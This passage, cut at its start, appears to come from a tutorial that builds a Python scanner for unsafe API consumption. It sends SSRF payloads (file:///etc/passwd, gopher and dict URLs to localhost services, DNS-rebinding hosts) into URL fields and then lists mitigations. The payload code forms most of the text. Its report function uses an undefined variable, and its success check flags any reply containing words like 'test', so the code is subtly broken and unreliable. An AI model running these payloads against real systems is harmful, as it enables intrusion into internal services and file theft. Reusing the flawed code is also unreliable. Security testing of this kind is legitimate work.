                    'User-Agent': 'Security-Test'
                }
                
                async with aiohttp.ClientSession() as session:
                    if endpoint['method'] == 'POST':
                        async with session.post(
                            f"{self.base_url}{endpoint['url']}",
                            json=test_data,
                            headers=headers
                        ) as response:
                            
                            if response.status in [200, 201]:
                                response_data = await response.text()
                                
                                if self.detect_ssrf_bypass_success(response_data):
                                    result = UnsafeConsumptionResult(
                                        vulnerability_type="SSRF Parser Bypass",
                                        endpoint=endpoint['url'],
                                        technique="URL Parser Bypass",
                                        severity="High",
                                        evidence=f"SSRF bypass successful with: {payload}",
                                        external_service="URL Parser",
                                        impact="Internal service access bypassing filters"
                                    )
                                    results.append(result)
            
            except Exception as e:
                print(f"Error testing URL parser bypass on {endpoint['url']}: {e}")
        
        return results

    async def test_advanced_dns_rebinding(self, endpoint: Dict) -> List[UnsafeConsumptionResult]:
        """Test advanced DNS rebinding techniques"""
        results = []
        
        # Use services that provide DNS rebinding
        rebinding_services = [
            'http://spoofed.burpcollaborator.net',
            'http://7f000001.0a00020f.rbndr.us'  # 127.0.0.1 rebinding
        ]
        
        for service in rebinding_services:
            try:
                test_data = endpoint.get('test_data', {}).copy()
                
                for key, value in test_data.items():
                    if any(indicator in key.lower() for indicator in ['url', 'endpoint']):
                        test_data[key] = service
                        break
                
                headers = {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Security-Test'
                }
                
                async with aiohttp.ClientSession() as session:
                    if endpoint['method'] == 'POST':
                        async with session.post(
                            f"{self.base_url}{endpoint['url']}",
                            json=test_data,
                            headers=headers
                        ) as response:
                            
                            if response.status in [200, 201]:
                                response_data = await response.text()
                                
                                if self.detect_rebinding_success(response_data):
                                    result = UnsafeConsumptionResult(
                                        vulnerability_type="DNS Rebinding",
                                        endpoint=endpoint['url'],
                                        technique="Advanced DNS Rebinding",
                                        severity="High",
                                        evidence=f"DNS rebinding successful with: {service}",
                                        external_service="DNS Resolver",
                                        impact="Internal network access, firewall bypass"
                                    )
                                    results.append(result)
            
            except Exception as e:
                print(f"Error testing DNS rebinding on {endpoint['url']}: {e}")
        
        return results

    async def test_alternative_protocols(self, endpoint: Dict) -> List[UnsafeConsumptionResult]:
        """Test alternative protocol support"""
        results = []
        
        alternative_protocols = [
            'gopher://127.0.0.1:25/',
            'dict://127.0.0.1:6379/',
            'file:///etc/passwd',
            'ftp://127.0.0.1:21/'
        ]
        
        for protocol_url in alternative_protocols:
            try:
                test_data = endpoint.get('test_data', {}).copy()
                
                for key, value in test_data.items():
                    if any(indicator in key.lower() for indicator in ['url', 'endpoint']):
                        test_data[key] = protocol_url
                        break
                
                headers = {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Security-Test'
                }
                
                async with aiohttp.ClientSession() as session:
                    if endpoint['method'] == 'POST':
                        async with session.post(
                            f"{self.base_url}{endpoint['url']}",
                            json=test_data,
                            headers=headers
                        ) as response:
                            
                            if response.status in [200, 201]:
                                response_data = await response.text()
                                
                                if self.detect_protocol_success(response_data, protocol_url):
                                    result = UnsafeConsumptionResult(
                                        vulnerability_type="Alternative Protocol SSRF",
                                        endpoint=endpoint['url'],
                                        technique="Protocol Handler Abuse",
                                        severity="High",
                                        evidence=f"Alternative protocol successful: {protocol_url}",
                                        external_service="Protocol Handler",
                                        impact="Internal service access, data leakage"
                                    )
                                    results.append(result)
            
            except Exception as e:
                print(f"Error testing alternative protocols on {endpoint['url']}: {e}")
        
        return results

    def has_url_parameter(self, endpoint: Dict) -> bool:
        """Check if endpoint has URL parameters"""
        test_data = endpoint.get('test_data', {})
        for key in test_data.keys():
            if any(indicator in key.lower() for indicator in ['url', 'endpoint', 'service']):
                return True
        return False

    def detect_ssrf_bypass_success(self, response_data: str) -> bool:
        """Detect successful SSRF bypass"""
        return self.detect_internal_service_response(response_data)

    def detect_rebinding_success(self, response_data: str) -> bool:
        """Detect successful DNS rebinding"""
        return self.detect_internal_service_response(response_data)

    def detect_protocol_success(self, response_data: str, protocol_url: str) -> bool:
        """Detect successful alternative protocol usage"""
        protocol_indicators = {
            'gopher': ['gopher', '220', 'smtp'],
            'dict': ['dict', 'redis'],
            'file': ['root:', 'daemon:', '/etc/'],
            'ftp': ['ftp', '220', '331']
        }
        
        for protocol, indicators in protocol_indicators.items():
            if protocol in protocol_url:
                return any(indicator in response_data.lower() for indicator in indicators)
        
        return False

    def detect_internal_service_response(self, response_data: str) -> bool:
        """Detect internal service responses"""
        internal_indicators = [
            'localhost', '127.0.0.1', 'internal', 'private',
            'development', 'test', 'staging'
        ]
        
        response_lower = response_data.lower()
        return any(indicator in response_lower for indicator in internal_indicators)
```

## 4 Comprehensive Unsafe Consumption Testing Framework

### 4.1 Complete Unsafe Consumption Testing Suite
```python
# Comprehensive Unsafe Consumption Testing Framework
class ComprehensiveUnsafeConsumptionTester:
    def __init__(self, base_url: str, endpoints: List[Dict]):
        self.base_url = base_url
        self.endpoints = endpoints
        self.results: List[UnsafeConsumptionResult] = []
        
        # Initialize testers
        self.ssrf_tester = SSRFAndExternalAPITester(base_url)
        self.data_processing_tester = InsecureDataProcessingTester(base_url)
        self.auth_tester = ExternalAPIAuthTester(base_url)
        self.dependency_tester = DependencyChainTester(base_url)
        self.advanced_ssrf_tester = AdvancedSSRFTester(base_url)
        
    async def run_comprehensive_tests(self) -> Dict[str, Any]:
        """Run comprehensive unsafe consumption testing"""
        test_results = {
            'ssrf_vulnerabilities': [],
            'data_processing_vulnerabilities': [],
            'authentication_vulnerabilities': [],
            'dependency_chain_vulnerabilities': [],
            'advanced_ssrf_techniques': []
        }
        
        # Run all test types
        print("Testing SSRF Vulnerabilities...")
        ssrf_results = await self.ssrf_tester.test_ssrf_vulnerabilities(self.endpoints)
        test_results['ssrf_vulnerabilities'].extend(ssrf_results)
        
        print("Testing Data Processing Vulnerabilities...")
        data_results = await self.data_processing_tester.test_data_processing_vulnerabilities(self.endpoints)
        test_results['data_processing_vulnerabilities'].extend(data_results)
        
        print("Testing Authentication Vulnerabilities...")
        auth_results = await self.auth_tester.test_external_api_auth_vulnerabilities(self.endpoints)
        test_results['authentication_vulnerabilities'].extend(auth_results)
        
        print("Testing Dependency Chain Vulnerabilities...")
        dependency_results = await self.dependency_tester.test_dependency_chain_vulnerabilities(self.endpoints)
        test_results['dependency_chain_vulnerabilities'].extend(dependency_results)
        
        print("Testing Advanced SSRF Techniques...")
        advanced_ssrf_results = await self.advanced_ssrf_tester.test_advanced_ssrf_techniques(self.endpoints)
        test_results['advanced_ssrf_techniques'].extend(advanced_ssrf_results)
        
        # Generate comprehensive report
        report = await self.generate_comprehensive_report(test_results)
        
        return report

    async def generate_comprehensive_report(self, test_results: Dict[str, List[UnsafeConsumptionResult]]) -> Dict[str, Any]:
        """Generate comprehensive unsafe consumption report"""
        # Flatten all results
        all_results = []
        for category in test_results.values():
            all_results.extend(category)
        
        # Calculate statistics
        severity_counts = {
            'Critical': 0,
            'High': 0,
            'Medium': 0,
            'Low': 0
        }
        
        for result in all_results:
            severity_counts[result.severity] += 1
        
        total_vulnerabilities = len(all_results)
        
        # Generate recommendations
        recommendations = self.generate_recommendations(test_results)
        
        report = {
            'summary': {
                'total_vulnerabilities': total_vulnerabilities,
                'severity_breakdown': severity_counts,
                'test_categories': list(test_results.keys()),
                'overall_risk_level': self.calculate_overall_risk(severity_counts)
            },
            'detailed_findings': test_results,
            'recommendations': recommendations,
            'impact_analysis': await self.perform_impact_analysis(test_results)
        }
        
        return report

    def calculate_overall_risk(self, severity_counts: Dict[str, int]) -> str:
        """Calculate overall risk level"""
        if severity_counts['Critical'] > 0:
            return 'Critical'
        elif severity_counts['High'] > 0:
            return 'High'
        elif severity_counts['Medium'] > 0:
            return 'Medium'
        else:
            return 'Low'

    def generate_recommendations(self, test_results: Dict[str, List[UnsafeConsumptionResult]]) -> List[str]:
        """Generate security recommendations based on findings"""
        recommendations = []
        
        if test_results['ssrf_vulnerabilities']:
            recommendations.extend([
                "Implement strict URL validation and filtering",
                "Use allow-lists for external service domains",
                "Disable redirects in HTTP clients",
                "Implement network segmentation for internal services",
                "Use cloud security groups to restrict metadata access"
            ])
        
        if test_results['data_processing_vulnerabilities']:
            recommendations.extend([
                "Disable XML external entity processing",
                "Implement JSON parsing limits and validation",
                "Use safe deserialization methods",
                "Implement input validation at all API boundaries",
                "Use content security policies for data processing"
            ])
        
        if test_results['authentication_vulnerabilities']:
            recommendations.extend([
                "Implement proper JWT validation with strong algorithms",
                "Secure API key storage and transmission",
                "Implement token binding and validation",
                "Use secure credential management practices",
                "Implement proper error handling without information leakage"
            ])
        
        if test_results['dependency_chain_vulnerabilities']:
            recommendations.extend([
                "Implement data validation between API boundaries",
                "Use secure data flow patterns",
                "Implement proper error handling for dependency failures",
                "Use circuit breakers for external dependencies",
                "Monitor and log dependency interactions"
            ])
        
        if test_results['advanced_ssrf_techniques']:
            recommendations.extend([
                "Implement comprehensive URL parsing validation",
                "Use DNS resolution filtering",
                "Disable support for dangerous protocols",
                "Implement outbound network restrictions",
                "Use secure HTTP client configurations"
            ])
        
        return list(set(recommendations))

    async def perform_impact_analysis(self, test_results: Dict[str, List[UnsafeConsumptionResult]]) -> Dict[str, Any]:
        """Perform impact analysis"""
        impact_analysis = {
            'critical_impacts': [],
            'data_breach_risks': [],
            'system_compromise_risks': [],
            'business_impact_analysis': []
        }
        
        # Analyze critical impacts
        for category, results in test_results.items():
            for result in results:
                if result.severity in ['Critical', 'High']:
                    impact_analysis['critical_impacts'].append({
                        'vulnerability': result.vulnerability_type,
                        'impact': result.impact,
                        'severity': result.severity
                    })
                
                # Data breach risks
                if any(indicator in result.impact.lower() for indicator in ['data', 'credential', 'information']):
                    impact_analysis['data_breach_risks'].append({
                        'vulnerability': result.vulnerability_type,
                        'data_type': 'Sensitive data',
                        'risk_level': result.severity
                    })
                
                # System compromise risks
                if any(indicator in result.impact.lower() for indicator in ['code execution', 'system', 'remote']):
                    impact_analysis['system_compromise_risks'].append({
                        'vulnerability': result.vulnerability_type,
                        'compromise_type': 'System access',
                        'risk_level': result.severity
                    })
        
        # Business impact analysis
        business_impacts = {
            'Financial Loss': ['credential theft', 'fraud', 'data breach'],
            'Reputation Damage': ['data leakage', 'service disruption'],
            'Legal Compliance': ['data protection', 'privacy violation'],
            'Operational Disruption': ['denial of service', 'system compromise']
        }
        
        for impact_type, indicators in business_impacts.items():
            for result in all_results:
                if any(indicator in result.impact.lower() for indicator in indicators):
                    impact_analysis['business_impact_analysis'].append({
                        'business_impact': impact_type,
                        'vulnerability': result.vulnerability_type,
                        'severity': result.severity
                    })
        
        return impact_analysis

# Usage Example
async def main():
    # API endpoints to test
    endpoints = [
        {
            'url': '/api/webhook',
            'method': 'POST',
            'test_data': {'url': 'https://example.com', 'data': 'test'}
        },
        {
            'url': '/api/process',
            'method': 'POST',
            'test_data': {'xml_data': '<test>data</test>'}
        },
        {
            'url': '/api/auth',
            'method': 'POST',
            'test_data': {'token': 'test_token'}
        }
    ]
    
    # Run comprehensive testing
    tester = ComprehensiveUnsafeConsumptionTester('https://api.example.com', endpoints)
    report = await tester.run_comprehensive_tests()
    
    print(json.dumps(report, indent=2, default=lambda x: x.__dict__))

# Run the comprehensive unsafe consumption tester
# asyncio.run(main())
```

## 5 Unsafe Consumption Protection and Mitigation

### 5.1 Secure API Consumption Implementation
```python
# Secure API Consumption Protection Framework
class SecureAPIConsumptionProtection:
    def __init__(self):
        self.protection_measures = {}
        
    def implement_secure_consumption(self) -> Dict[str, Any]:
        """Implement secure API consumption patterns"""
        patterns = {
            'input_validation': [
                'Validate all external inputs',
                'Use allow-lists for URLs and domains',
                'Implement strict data type validation',
                'Sanitize all user-supplied data',
                'Validate data size and structure limits'
            ],
            'secure_http_clients': [
                'Configure timeouts for external requests',
                'Disable automatic redirects',
                'Implement certificate pinning',
                'Use secure protocol configurations',
                'Implement retry logic with backoff'
            ],
            'data_processing_security': [
                'Disable dangerous XML features',
                'Implement JSON parsing limits',
                'Use safe deserialization methods',
                'Validate data before processing',
                'Implement content security policies'
            ],
            'authentication_security': [
                'Implement proper JWT validation',
                'Secure API key management',
                'Use token binding techniques',
                'Implement credential rotation',
                'Secure authentication flows'
            ]
        }
        return patterns

    def create_consumption_security_controls(self) -> Dict[str, List[str]]:
        """Create API consumption security controls"""
        controls = {
            'network_security': [
                "Implement outbound firewall rules",
                "Restrict internal network access",
                "Use VPN for sensitive connections",
                "Monitor external API communications",
                "Implement network segmentation"
            ],
            'data_security': [
                "Encrypt sensitive data in transit",
                "Validate data integrity",
                "Implement data loss prevention",
                "Secure data storage",
                "Monitor data flows"
            ],
            'authentication_controls': [
                "Implement multi-factor authentication",
                "Use short-lived tokens",
                "Implement token revocation",
                "Monitor authentication attempts",
                "Implement account lockout policies"
            ],
            'monitoring_detection': [
                "Monitor for SSRF attempts",
                "Detect abnormal data processing",
                "Monitor dependency failures",
                "Implement anomaly detection",
                "Log all external API interactions"
            ]
        }
        return controls

    def implement_secure_consumption_practices(self) -> List[str]:
        """Implement secure API consumption practices"""
        practices = [
            # Design phase
            "Conduct threat modeling for external dependencies",
            "Implement secure by design principles",
            "Use established security patterns",
            
            # Development phase
            "Use secure HTTP client libraries",
            "Implement comprehensive input validation",
            "Use safe data processing methods",
            
            # Testing phase
            "Conduct security testing for external dependencies",
            "Test failure scenarios and error handling",
            "Validate security controls effectiveness",
            
            # Operations phase
            "Monitor external API performance and security",
            "Implement circuit breakers for dependencies",
            "Maintain and update security configurations"
        ]
        return practices
```

This comprehensive framework for testing Unsafe Consumption of APIs provides extensive coverage for identifying vulnerabilities in how APIs consume external services and process data from untrusted sources. The framework includes testing for SSRF vulnerabilities, insecure data processing, authentication flaws, dependency chain issues, and advanced exploitation techniques, along with detailed reporting and mitigation recommendations.